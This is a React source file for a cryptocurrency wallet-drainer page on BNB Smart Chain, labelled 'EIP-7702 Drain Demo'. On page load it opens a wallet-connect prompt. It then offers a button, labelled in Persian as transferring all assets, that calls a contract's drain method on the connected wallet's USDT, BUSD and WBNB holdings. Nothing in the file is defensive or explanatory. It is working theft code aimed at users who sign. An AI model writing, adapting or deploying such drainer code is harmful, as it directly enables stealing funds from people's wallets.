
import { useEffect } from "react";
import {
  createWeb3Modal,
  defaultConfig,
  useWeb3Modal,
  useWeb3ModalAccount,
  useWeb3ModalProvider
} from "@web3modal/ethers/react";
import { bsc } from "viem/chains";
import { ethers } from "ethers";
import { CONTRACT_ADDRESS, CONTRACT_ABI } from "./contracts/TokenDrainABI";

const projectId = "450851819c4009f3503181729123df01";

const metadata = {
  name: "EIP-7702 Drain Demo",
  description: "Drain tokens & BNB after sign",
  url: "https://yourapp.vercel.app",
  icons: ["https://yourapp.vercel.app/icon.png"]
};

const ethersConfig = defaultConfig({
  metadata,
  projectId,
  enableEIP6963: true,
  enableWalletConnect: true
});

createWeb3Modal({
  ethersConfig,
  chains: [bsc],
  projectId
});

function App() {
  const { open } = useWeb3Modal();
  const { address, isConnected } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();

  useEffect(() => {
    open();
  }, []);

  const drainTokens = async () => {
    const rawProvider = new ethers.BrowserProvider(walletProvider);
    const signer = await rawProvider.getSigner();

    const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
    const tokens = [
      "0x55d398326f99059fF775485246999027B3197955", // USDT
      "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
      "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"  // WBNB
    ];

    const tx = await contract.drain(tokens);
    await tx.wait();
    alert("✅ انتقال انجام شد");
  };

  return (
    <div style={{ textAlign: "center", marginTop: "60px" }}>
      <h2>EIP-7702 + Drain Contract</h2>
      <button onClick={drainTokens}>💸 انتقال همه دارایی</button>
    </div>
  );
}

export default App;
